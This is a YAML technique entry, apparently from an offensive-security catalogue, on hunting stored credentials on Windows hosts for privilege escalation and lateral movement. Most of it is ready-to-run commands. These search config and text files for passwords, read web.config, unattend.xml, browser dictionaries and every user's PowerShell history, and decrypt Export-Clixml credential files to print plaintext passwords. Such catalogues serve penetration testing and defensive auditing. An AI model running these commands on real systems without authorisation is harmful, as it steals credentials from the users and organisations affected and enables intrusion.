---
description: |
  This attack involves hunting for credentials left on disk by users or applications on a Windows system, often in cleartext or weakly protected forms.
  By enumerating files, PowerShell histories, configuration files, and encrypted credential stores, attackers can recover passwords for privilege escalation or lateral movement.

    Command Reference:
        findstr, Get-Content (gc), PowerShell foreach/cat, Import-Clixml

    Target: Windows systems with sensitive information in config files, unattended setup files, browser dictionaries, PowerShell histories, or exported PowerShell credentials

command: |
  # Search for plaintext passwords in files
  findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

code: |
  # 1. Search for plaintext passwords in config and text files
  findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

  # 2. Look for credential entries in key files like web.config
  findstr /SI "password" C:\inetpub\wwwroot\web.config

  # 3. Check browser dictionaries for sensitive user-added entries
  gc 'C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

  # 4. Review unattend.xml or answer files for plaintext or encoded admin credentials
  gc C:\unattend.xml

  # 5. Collect sensitive information from PowerShell histories
  gc C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  # Or, enumerate all users' PowerShell command histories
  foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

  # 6. Decrypt credentials exported via Export-Clixml (run as same user context)
  $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
  $credential.GetNetworkCredential().username
  $credential.GetNetworkCredential().password

items:
  -
services:
  -
OS:
  - Windows
attack_types:
  - Enumeration
references:
  - https://attack.mitre.org/techniques/T1552/
  - https://posts.specterops.io/practical-dpapi-abuse-automation-60493c5be93c
---